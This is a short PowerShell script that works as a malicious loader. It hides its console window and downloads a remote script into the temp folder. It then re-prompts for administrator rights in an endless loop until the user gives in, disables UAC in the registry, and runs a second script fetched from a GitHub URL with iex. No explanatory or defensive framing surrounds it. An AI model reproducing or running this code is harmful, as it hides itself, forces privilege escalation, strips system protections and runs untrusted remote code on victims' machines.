# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== ADMIN CHECK + ELEVATION =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $tmp = Join-Path $env:TEMP "_svc.ps1"
    (iwr "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
    while ($true) {
        $p = Start-Process powershell -Verb RunAs -PassThru -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
        if ($p -ne $null) { [Environment]::Exit(0) }
        Start-Sleep -Seconds 2
    }
}

$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://github.com/analysisw/test/raw/refs/heads/main/teest.ps1' -UseBasicParsing).Content
